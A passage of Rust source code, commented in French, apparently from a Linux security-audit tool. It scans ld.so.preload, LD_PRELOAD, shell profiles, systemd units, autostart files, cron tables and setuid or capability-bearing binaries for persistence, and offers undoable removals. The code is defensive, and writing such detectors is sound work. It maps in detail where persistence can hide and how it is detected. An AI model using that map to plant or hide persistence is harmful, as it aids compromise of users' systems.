        None => (
            fichier
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
            parent,
            false,
        ),
    };
    let dossiers = dossiers_d_unites(r, utilisateur)?;
    let mut lies = Vec::new();
    // L'unité que systemd lance : la première de ce nom dans l'ordre de ses dossiers.
    let premiere = dossiers
        .iter()
        .find(|d| std::fs::symlink_metadata(d.join(&nom)).is_ok());
    if !ajout {
        if let Some(d) = premiere.filter(|d| d.as_path() != dossier) {
            return Err(temoins::Refus(trf!(
                "une unité du même nom dans {} passe avant {} : c'est elle que systemd lance",
                "a unit of the same name in {} takes precedence over {}: that is the one systemd starts",
                crate::ui::affichable(&r.montre(d)),
                crate::ui::affichable(&r.montre(fichier))
            )));
        }
    } else if let Some(d) = premiere {
        let f = d.join(&nom);
        lies.push((r.montre(&f), lire_ajout(r, &f)?));
    }
    let noms = ajouts_de(&nom);
    // Une ligne d'un gabarit (« a@.service ») vaut pour chaque instance : leurs ajouts (« a@x.service.d ») aussi.
    let instances = nom
        .rsplit_once('.')
        .and_then(|(b, g)| b.strip_suffix('@').map(|b| (format!("{b}@"), format!(".{g}.d"))));
    let illisible = |d: &Path, e: std::io::Error| {
        temoins::Refus(trf!(
            "{} ne se lit pas ({e})",
            "{} cannot be read ({e})",
            crate::ui::affichable(&r.montre(d))
        ))
    };
    let mut ajouts = Vec::new();
    for d in &dossiers {
        let entrees = match std::fs::read_dir(d) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(illisible(d, e)),
        };
        for e in entrees.flatten() {
            let n = e.file_name().to_string_lossy().into_owned();
            let s_applique = noms.contains(&n)
                || instances
                    .as_ref()
                    .is_some_and(|(debut, fin)| n.starts_with(debut.as_str()) && n.ends_with(fin.as_str()));
            if !s_applique || !std::fs::metadata(e.path()).is_ok_and(|m| m.is_dir()) {
                continue;
            }
            for c in std::fs::read_dir(e.path())
                .map_err(|x| illisible(&e.path(), x))?
                .flatten()
            {
                if c.file_name().to_string_lossy().ends_with(".conf") {
                    ajouts.push(c.path());
                }
            }
        }
    }
    ajouts.sort();
    ajouts.dedup();
    ajouts.retain(|a| a != fichier);
    if ajouts.len() > AJOUTS_MAX {
        return Err(temoins::Refus(trf!(
            "{} fichiers d'ajout pour cette unité, plus que les {AJOUTS_MAX} qui se relisent à chaque bilan",
            "{} drop-in files for this unit, more than the {AJOUTS_MAX} re-read at each check",
            ajouts.len()
        )));
    }
    for a in ajouts {
        lies.push((r.montre(&a), lire_ajout(r, &a)?));
    }
    Ok(lies)
}

/// Le dossier personnel, en texte, pour déplier « %h/ » d'une unité de l'utilisateur.
fn maison_texte(t: &Lancements) -> String {
    t.r.maison.to_string_lossy().into_owned()
}

/// La ligne `l` (lue par `lines()`) telle qu'écrite dans `texte`, coupée au seul « \n » comme la relit le fils root.
fn telle_qu_ecrite(texte: &str, l: &str) -> String {
    texte
        .split('\n')
        .find(|r| r.strip_suffix('\r').unwrap_or(r) == l)
        .unwrap_or(l)
        .to_string()
}

/// Le fichier et la ligne à retirer, pour `Lancements::retraits`.
fn retrait(f: &Path, texte: &str, l: &str) -> Option<(String, String)> {
    Some((f.to_str()?.to_string(), telle_qu_ecrite(texte, l)))
}

/// /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris. Technique
/// classique des rootkits ; presque aucun système normal n'en a. Puis LD_PRELOAD et LD_AUDIT de cette session.
fn lire_prechargement(
    racine: &Path,
    variable: &impl Fn(&str) -> Option<std::ffi::OsString>,
    gestion: Option<Paquets>,
    t: &mut Lancements,
) {
    let preload = racine.join("etc/ld.so.preload");
    let h = t.r.maison.clone();
    if let Some(lu) = lire(&preload, &h, t) {
        // Coupée comme la coupe le chargeur : espace, tabulation, « : ».
        let libs: Vec<(usize, &str, &str)> = lu
            .texte
            .lines()
            .enumerate()
            .filter(|(_, l)| !commentaire(l))
            .flat_map(|(n, l)| {
                l.split([' ', '\t', ':'])
                    .filter(|m| !m.is_empty())
                    .map(move |lib| (n, l, lib))
            })
            .collect();
        for (n, ligne, lib) in libs {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            t.sources.push(source_de("preload", lib));
            t.retraits.push(retrait(&preload, &lu.texte, ligne));
            let d = designes::bibliotheques(lib, designes::Liste::Fichier);
            let temoin = temoin_de_ligne(t, &preload, n, &lu, ligne, d, Sorte::Shell);
            t.temoins.push(temoin);
            // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
            let lib = crate::ui::affichable(lib);
            if connue {
                t.suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                t.critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
            let valeur = v.to_string_lossy();
            t.sources.push(source_de(&format!("env:{var}"), &valeur));
            t.retraits.push(None);
            let d = designes::bibliotheques(&valeur, designes::Liste::Variable);
            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, &valeur)).map(|c| {
                temoins::temoin(
                    &format!("env:{var}"),
                    trf!("{var} de cette session", "{var} of this session"),
                    &valeur,
                    None,
                    &c,
                )
            });
            t.temoins.push(temoin);
            t.suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                crate::ui::affichable(&v.to_string_lossy())
            ));
        }
    }
}

/// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte.
fn fichiers_de_configuration(racine: &Path, h: &Path) -> Vec<std::path::PathBuf> {
    let etc = |chemin: &str| racine.join(chemin);
    let mut configuration: Vec<std::path::PathBuf> = [
        "etc/environment",
        "etc/profile",
        "etc/bash.bashrc",
        "etc/zsh/zshenv",
        "etc/zsh/zprofile",
    ]
    .iter()
    .map(|c| etc(c))
    .collect();
    configuration.extend(fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]));
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".xprofile",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    for f in std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
    {
        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
            configuration.push(f.path());
        }
    }
    configuration
}

/// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), et ceux de
/// Hyprland à part : ils sont aussi des fichiers de configuration.
fn fichiers_de_demarrage(racine: &Path, h: &Path) -> (Vec<std::path::PathBuf>, Vec<std::path::PathBuf>) {
    const UNITES: [&str; 5] = ["service", "timer", "socket", "path", "conf"];
    let etc = |chemin: &str| racine.join(chemin);
    let mut demarrage = Vec::new();
    // Les dossiers d'unités du système et des comptes : les liens y sont des alias ou des activations, vers des
    // unités lues ailleurs.
    for d in ["etc/systemd/system", "etc/systemd/user"] {
        let mut unites = fichiers_de(&etc(d), &UNITES);
        unites.retain(|p| !p.is_symlink());
        demarrage.extend(unites);
    }
    // Ceux du compte, dont user.control (prioritaire) et ~/.local/share (installées par le compte).
    for d in [
        ".config/systemd/user",
        ".config/systemd/user.control",
        ".local/share/systemd/user",
    ] {
        demarrage.extend(fichiers_de(&h.join(d), &UNITES));
    }
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
    demarrage.extend(hypr.iter().cloned());
    (demarrage, hypr)
}

/// Dans les fichiers de configuration : un préchargement, ou une commande suspecte hors des lignes de démarrage
/// (jugées à part).
fn juger_configuration(
    configuration: &[std::path::PathBuf],
    demarrage: &[std::path::PathBuf],
    h: &Path,
    t: &mut Lancements,
) {
    for f in configuration {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        for (n, l) in lu.texte.lines().enumerate() {
            if definit_prechargement(l) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let d = designes::prechargement(l);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f, h),
                    n.saturating_add(1)
                ));
            } else if !commentaire(l)
                && !demarrage.contains(f)
                && let Some(raison) = commande_suspecte(l, false)
            {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let d = designes::commande(l, designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
    }
}

/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement.
fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
    for f in demarrage {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        let sorte = Sorte::de(f, &t.r);
        for (n, l) in lu.texte.lines().enumerate() {
            let Some((commande, ambigue)) = commande_lancee_lue(l) else {
                continue;
            };
            if let Some(raison) = commande_suspecte(&commande, true) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let maison = maison_texte(t);
                let d = if ambigue {
                    Designe::Indefini(designes::Flou::Syntaxe)
                } else {
                    designes::commande(&commande, sorte.contexte(&maison))
                };
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, sorte);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
    }
}

/// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
/// compte qui la lance. Coupée comme la coupe cron : espace et tabulation.
fn commande_de_cron(l: &str, systeme: bool) -> String {
    let l = l.trim_matches([' ', '\t']);
    let champs: usize = match (l.starts_with('@'), systeme) {
        (true, false) => 1,
        (true, true) => 2,
        (false, false) => 5,
        (false, true) => 6,
    };
    l.split([' ', '\t'])
        .filter(|m| !m.is_empty())
        .skip(champs)
        .collect::<Vec<_>>()
        .join(" ")
}

/// La crontab du compte et celles du système : chaque ligne est une commande.
fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
    let etc = |chemin: &str| racine.join(chemin);
    let crontab = crontab.unwrap_or_default();
    // La crontab du compte n'a pas de fichier qu'un geste de défense toucherait ; son texte entier est son témoin.
    for (n, l) in crontab.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            t.sources.push(source_de("crontab", l));
            t.retraits.push(None);
            let numero = n.saturating_add(1);
            let d = designes::commande(&commande_de_cron(l, false), designes::Contexte::Shell);
            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, l)).map(|c| {
                temoins::temoin(
                    &format!("crontab:{numero}"),
                    format!("crontab:{numero}"),
                    l,
                    Some(&temoins::Etat::du_contenu(crontab.as_bytes())),
                    &c,
                )
            });
            t.temoins.push(temoin);
            t.suspects.push(trf!("crontab : {raison}", "crontab: {raison}"));
        }
    }
    let mut fichiers_cron = vec![etc("etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir(etc("etc/cron.d"))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    let h = t.r.maison.clone();
    for f in fichiers_cron {
        let Some(lu) = lire(&f, &h, t) else {
            continue;
        };
        let source = crate::ui::chemin_affichable(&f);
        for (n, l) in lu.texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
            if let Some(raison) = commande_suspecte(l, false) {
                t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
                t.retraits.push(retrait(&f, &lu.texte, l));
                let d = designes::commande(&commande_de_cron(l, true), designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
            }
        }
    }
}

/// Le constat des lancements : aucun suspect, ou une alerte (critique si une bibliothèque hors paquet est préchargée)
/// qui en nomme six au plus.
fn constat_des_lancements(t: Lancements) -> Constat {
    const CAT: &str = "Persistance";
    let Lancements {
        critiques,
        mut suspects,
        sources,
        mut retraits,
        temoins: releves,
        ..
    } = t;
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        return ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        );
    }
    let niveau = if critiques.is_empty() {
        Niveau::Eleve
    } else {
        Niveau::Critique
    };
    let mut liste = critiques;
    liste.extend(suspects);
    let reste = liste.len().saturating_sub(6);
    liste.truncate(6);
    let mut message = trf!(
        "Lancement automatique suspect : {}",
        "Suspicious autostart: {}",
        liste.join(" ; ")
    );
    if reste > 0 {
        let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
    }
    message.push('.');
    let constat = alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
        tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que vous n'avez pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
        &[],
    );
    // Par des gestes de défense seulement si chaque ligne signalée est dans un fichier du système qu'un geste a le
    // droit de modifier : une ligne du dossier personnel, de la crontab du compte ou une variable de la session
    // laisse tout à la main (une correction qui en ferait une partie se croirait complète).
    retraits.dedup();
    let mut vus: Vec<&(String, String)> = Vec::new();
    let mut a_la_main = false;
    for r in &retraits {
        match r {
            Some(r) if !vus.contains(&r) => vus.push(r),
            Some(_) => {}
            None => a_la_main = true,
        }
    }
    let gestes = if a_la_main {
        Vec::new()
    } else {
        crate::machine::defense::tous(vus, |(f, l)| crate::machine::defense::retirer_ligne(f, l))
    };
    crate::machine::defense::corriger(
        constat,
        tr!(
            "Retirer ces lignes (chaque fichier est gardé entier dans sa note, Défaire le remet), puis lancer l'antivirus",
            "Remove these lines (each file is kept whole in its note, Undo puts it back), then run the antivirus"
        ),
        &gestes,
    )
    .avec_temoins(temoins::Temoins::de(releves))
}

/// Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root. On les nomme
/// pour que tu les reconnaisses, sans baisser la note.
fn services_ajoutes(racine: &Path, gestion: Option<Paquets>, r: &mut Releveur) -> Option<Constat> {
    let gestion = gestion?;
    let systeme = racine.join("etc/systemd/system");
    let mut fichiers: Vec<std::path::PathBuf> = fichiers_de(&systeme, &["service", "timer"])
        .into_iter()
        .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
        .filter(|p| !gestion.possede(p))
        .collect();
    fichiers.sort();
    let ajoutes: Vec<String> = fichiers
        .iter()
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    // Un choix « normal » est lié au contenu de chaque fichier de service, à ce qu'il lance et à ses ajouts :
    // changé, l'information revient.
    let mut releves = Vec::with_capacity(fichiers.len());
    for f in &fichiers {
        let temoin = if releves.len() >= temoins::TEMOINS_MAX {
            Err(temoins::Refus(trf!(
                "plus de {} services ajoutés, plus que ceux qui se montrent avant un tel choix",
                "more than {} added services, more than can be shown before such a choice",
                temoins::TEMOINS_MAX
            )))
        } else {
            temoin_de_service(r, f)
        };
        releves.push(temoin);
    }
    // Seulement depuis la vraie racine : les noms d'une arborescence fabriquée ne désignent rien de cet ordinateur.
    juger_services_ajoutes(&ajoutes, racine == Path::new("/")).map(|c| c.avec_temoins(temoins::Temoins::de(releves)))
}

/// Le témoin d'un service système ajouté à la main : son fichier, chaque programme que lancent ses lignes « Exec… »
/// (`designes`, comme une unité du système), et ses ajouts (`unite`).
fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temoins::Refus> {
    let montre = crate::ui::chemin_affichable(f);
    let lu = temoins::lire_borne(f, AJOUT_MAX)
        .map_err(|e| temoins::Refus(trf!("{montre} ne se lit pas ({e})", "{montre} cannot be read ({e})")))?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{montre} est trop gros pour être relu à chaque bilan",
            "{montre} is too large to be re-read at each check"
        )));
    }
    let texte = String::from_utf8_lossy(&lu.octets);
    let mut cibles_liees = Vec::new();
    for l in texte.lines() {
        let Some((commande, _)) = commande_lancee_lue(l) else {
            continue;
        };
        let d = designes::commande(&commande, designes::Contexte::Unite(None));
        cibles_liees.extend(cibles(r, d, l)?);
    }
    cibles_liees.extend(unite(r, f, &texte, false)?);
    let nom = f
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    Ok(temoins::temoin(
        &f.to_string_lossy(),
        montre,
        &nom,
        Some(&temoins::etat_du_contenant(f, &lu.octets)),
        &cibles_liees,
    ))
}

/// `ajoutes` : les noms de fichier tels que lus (triés). `gestes` : désactiver chacun par un geste de défense, chacun
/// demandé à part sur le terminal ; jamais une unité de session (connexion à distance, écran de connexion), que
/// l'enfant root refuserait. Un nom qu'un geste ne porte pas (forgé, gabarit) laisse tout à la main.
fn juger_services_ajoutes(ajoutes: &[String], gestes: bool) -> Option<Constat> {
    const CAT: &str = "Persistance";
    let affiches: Vec<String> = ajoutes.iter().map(|n| crate::ui::affichable(n)).collect();
    let premier = affiches.first()?.clone();
    let constat = alerte(
        CAT,
        Niveau::Info,
        trf!(
            "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
            "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
            affiches.len(),
            affiches.join(", ")
        ),
    )
    .avec_objet(crate::modele::Objet::de("services", &affiches.join(",")))
    .manuel(
        tr!(
            "Si vous n'en reconnaissez pas un, lisez ce qu'il lance avant de le désactiver",
            "If you do not recognize one, read what it starts before turning it off"
        ),
        &[&format!("systemctl cat {}", crate::commande::sh_chaine(&premier))],
    );
    if !gestes {
        return Some(constat);
    }
    let gestes = crate::machine::defense::tous(
        ajoutes.iter().filter(|n| !gestes_unix::unite_portant_les_sessions(n)),
        |n| gestes_unix::NomUnite::nouveau(n).map(Defense::DesactiverService),
    );
    Some(crate::machine::defense::corriger(
        constat,
        tr!(
            "Désactiver ceux que vous ne reconnaissez pas (chacun demandé à part ; Défaire les remet) ; « systemctl cat <service> » montre ce qu'il lance",
            "Turn off the ones you do not recognize (each asked separately; Undo puts them back); “systemctl cat <service>” shows what it starts"
        ),
        &gestes,
    ))
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
/// Les fichiers de `d`, jusqu'à `profondeur` sous-dossiers plus bas, qui passent `test`.
fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
    for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
        let p = e.path();
        if e.file_type().is_ok_and(|t| t.is_dir()) {
            if profondeur > 0 {
                parcourir(&p, profondeur.saturating_sub(1), trouve, test);
            }
        } else if test(&p) {
            trouve.push(p);
        }
    }
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    let (mut anormaux, systeme, capacites) = programmes_privilegies();
    let gestion = Paquets::detecter();
    let (modifies, non_verifies) =
        gestion.map_or((Vec::new(), 0), |g| comparer_aux_paquets(g, &systeme, &mut anormaux));
    let mode = |p: &Path| std::fs::symlink_metadata(p).ok().map(|m| m.mode());
    let caps = capacites.as_deref().unwrap_or_default();
    let chemins_modifies: Vec<std::path::PathBuf> = modifies.iter().map(|(p, _)| p.clone()).collect();
    let gestes_modifies = gestes_de_privilegies(&chemins_modifies, caps, mode);
    let gestes_anormaux = gestes_de_privilegies(&anormaux, caps, mode);
    let modifies: Vec<(String, String)> = modifies
        .into_iter()
        .map(|(p, paquet)| (crate::ui::chemin_affichable(&p), paquet))
        .collect();
    let reinstaller = {
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default()
    };
    let path = std::env::var("PATH").unwrap_or_default();
    let path_dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    juger_fichiers_suspects(&Releve {
        modifies,
        anormaux,
        systeme: systeme.len(),
        gestion: gestion.is_some(),
        non_verifies,
        capacites_lues: capacites.is_some(),
        path_dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    })
}

/// Les gestes qui retirent leurs droits à ces programmes : le setuid/setgid de ceux qui l'ont (`mode`, lu sans
/// suivre de lien), les capacités de ceux que getcap a listés (`capacites`, chemins réels). Tous ou aucun : un chemin
/// qu'un geste ne porte pas, un programme qui n'a plus rien de privilégié (changé depuis le parcours), ou plus de
/// `defense::GESTES_MAX` gestes, et la liste reste à la main. L'enfant root rejuge chacun (paquet, chemin, sudo, su
/// et pkexec) avant de rien faire.
fn gestes_de_privilegies(
    chemins: &[std::path::PathBuf],
    capacites: &[std::path::PathBuf],
    mode: impl Fn(&Path) -> Option<u32>,
) -> Vec<Defense> {
    use std::os::unix::ffi::OsStrExt;
    let mut gestes = Vec::new();
    for p in chemins {
        let Some(c) = gestes_unix::CheminDesigne::nouveau(p.as_os_str().as_bytes()) else {
            return Vec::new();
        };
        let setuid = mode(p).is_some_and(|m| m & 0o6000 != 0);
        let reel = std::fs::canonicalize(p).unwrap_or_else(|_| p.clone());
        let caps = capacites.iter().any(|k| k == p || *k == reel);
        if !setuid && !caps {
            return Vec::new();
        }
        if setuid {
            gestes.push(Defense::RetirerSetuid(c));
        }
        if caps {
            gestes.push(Defense::RetirerCapacites(c));
        }
    }
    if gestes.len() > crate::machine::defense::GESTES_MAX {
        return Vec::new();
    }
    gestes
}

/// Les programmes privilégiés relevés : ceux des dossiers temporaires et personnels qui donnent des droits (setuid à un
/// autre compte, setgid du groupe root), ceux des dossiers du système (chemin réel, sans doublon), et ceux à capacités
/// (tels que getcap les nomme, puis par leur chemin réel ; `None` : getcap n'a pas répondu).
#[allow(
    clippy::type_complexity,
    reason = "trois listes rendues d'un seul parcours, nommées par la doc"
)]
fn programmes_privilegies() -> (
    Vec<std::path::PathBuf>,
    Vec<std::path::PathBuf>,
    Option<Vec<std::path::PathBuf>>,
) {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    // Lancé tout de suite, en même temps que les parcours : getcap relit tout /usr/lib (0,6 s).
    // Par son chemin : sous Debian, /usr/sbin n'est pas dans le PATH d'un compte ordinaire, et getcap n'y serait
    // jamais trouvé (les capacités jamais lues).
    let capacites = std::thread::spawn(|| {
        let getcap = crate::commande::outil_systeme("getcap")?;
        sortie(
            &getcap.to_string_lossy(),
            &[
                "-r",
                "/usr/bin",
                "/usr/sbin",
                "/usr/local",
                "/usr/lib",
                "/usr/libexec",
                "/opt",
                "/tmp",
                "/var/tmp",
                "/dev/shm",
            ],
        )
        .map(|s| fichiers_capacites(&s))
    });
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (home().as_str(), 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    let capacites = capacites.join().ok().flatten();
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let capacites = capacites.map(|v| {
        let mut tous: Vec<std::path::PathBuf> = v.iter().filter_map(|p| std::fs::canonicalize(p).ok()).collect();
        tous.extend(v);
        tous
    });
    (anormaux, systeme, capacites)
}

/// Chaque programme privilégié du système comparé à son paquet : ceux d'aucun paquet rejoignent `anormaux` ; rend les
/// modifiés (chemin, paquet) et le nombre de ceux qui n'ont pas pu être vérifiés.
fn comparer_aux_paquets(
    gestion: Paquets,
    systeme: &[std::path::PathBuf],
    anormaux: &mut Vec<std::path::PathBuf>,
) -> (Vec<(std::path::PathBuf, String)>, usize) {
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    for (p, proprietaire) in systeme.iter().zip(gestion.proprietaires(systeme)) {
        match proprietaire {
            Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
            None => anormaux.push(p.clone()),
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0usize);
    // Chaque paquet se vérifie à part (pacman, zcat et sha256sum, ou dpkg --verify, en lecture seule) : 16 à la
    // fois plutôt qu'un par un, une vingtaine de paquets attendaient l'un après l'autre.
    let paquets: Vec<(&String, &Vec<std::path::PathBuf>)> = par_paquet.iter().collect();
    let mut etats = Vec::new();
    for groupe in paquets.chunks(16) {
        std::thread::scope(|s| {
            let fils: Vec<_> = groupe
                .iter()
                .map(|(paquet, fichiers)| s.spawn(move || gestion.modifies(paquet, fichiers)))
                .collect();
            etats.extend(fils.into_iter().map(|f| f.join().unwrap_or_default()));
        });
    }
    for ((paquet, fichiers), etats) in paquets.into_iter().zip(etats) {
        // Un fil qui a planté rend une liste vide : ses fichiers comptent comme non vérifiés.
        let etats = etats.into_iter().chain(std::iter::repeat(None));
        for (f, etat) in fichiers.iter().zip(etats) {
            match etat {
                Some(true) => modifies.push((f.clone(), paquet.clone())),
                Some(false) => {}
                None => non_verifies = non_verifies.saturating_add(1),
            }
        }
    }
    (modifies, non_verifies)
}

/// Ce que la lecture des programmes privilégiés a relevé, pour son jugement (séparé pour le corpus de détection).
pub(super) struct Releve {
    /// Programmes privilégiés changés depuis leur installation : (chemin montré, paquet).
    pub modifies: Vec<(String, String)>,
    /// Hors paquet, ou dans un dossier temporaire.
    pub anormaux: Vec<std::path::PathBuf>,
    /// Combien de programmes privilégiés dans les dossiers du système.
    pub systeme: usize,
    /// Le gestionnaire de paquets est reconnu.
    pub gestion: bool,
    pub non_verifies: usize,
    /// getcap a répondu.
    pub capacites_lues: bool,
    /// Les dossiers du PATH où d'autres peuvent écrire.
    pub path_dangereux: Vec<String>,
    /// La commande qui remet les paquets des programmes modifiés.
    pub reinstaller: String,
    /// Les gestes de défense qui retirent leurs droits aux modifiés (`gestes_de_privilegies`) ; vide : à la main.
    pub gestes_modifies: Vec<Defense>,
    /// De même pour les anormaux.
    pub gestes_anormaux: Vec<Defense>,
}

pub(super) fn juger_fichiers_suspects(r: &Releve) -> Vec<Constat> {
    let Releve {
        modifies,
        anormaux,
        systeme: n,
        gestion,
        non_verifies,
        capacites_lues,
        path_dangereux: dangereux,
        reinstaller,
